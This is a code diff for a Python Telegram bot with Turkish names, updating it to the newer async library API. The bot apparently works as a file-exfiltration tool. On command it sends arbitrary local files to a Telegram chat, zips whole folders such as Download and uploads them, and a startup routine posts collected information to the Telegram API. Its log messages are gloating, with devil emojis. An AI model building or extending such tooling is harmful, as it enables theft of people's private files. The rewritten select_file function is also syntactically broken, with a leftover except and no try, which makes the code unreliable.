@@ -163,20 +163,16 @@ def bilgileri_kaydet_ve_gonder():
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
 
-def select_file(update, context):
-    try:
-        numara = context.args[0]
-        dosya_yolu = dosya_haritasi.get(numara)
-        if not dosya_yolu or not os.path.exists(dosya_yolu):
-            update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
-            return
-        with open(dosya_yolu, "rb") as f:
-            update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
+async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    numara = context.args[0]
+    dosya_yolu = dosya_haritasi.get(numara)
+    with open(dosya_yolu, "rb") as f:
+        await update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
         print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
     except:
         update.message.reply_text("Hata, dosya gönderilemedi!")
 
-def category(update, context):
+async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _, klasorler = dosya_tara()  # Klasör listesini al
     kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
     mesaj = (
@@ -185,7 +181,7 @@ def category(update, context):
         "Örnek: /category Download"
     )
     if not context.args:
-        update.message.reply_text(mesaj)
+        await update.message.reply_text(mesaj)
         return
     
     kategori = " ".join(context.args).strip()
@@ -201,7 +197,7 @@ def category(update, context):
     
     try:
         with open(arsiv_yolu, "rb") as f:
-            update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
+            await update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
         print(f"{kategori} kategorisi arşivi ({arsiv_yolu}) Telegram'a gönderildi!")
         os.remove(arsiv_yolu)  # Arşivi gönderildikten sonra sil
         print(f"{arsiv_yolu} silindi!")
@@ -210,13 +206,10 @@ def category(update, context):
 
 def main():
     print("Botu başlatıyorum, kral! 😈")
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("select", select_file, pass_args=True))
-    dp.add_handler(CommandHandler("category", category, pass_args=True))
-    bilgileri_kaydet_ve_gonder()
-    updater.start_polling()
-    updater.idle()
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("select", select_file))
+    application.add_handler(CommandHandler("category", category))
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
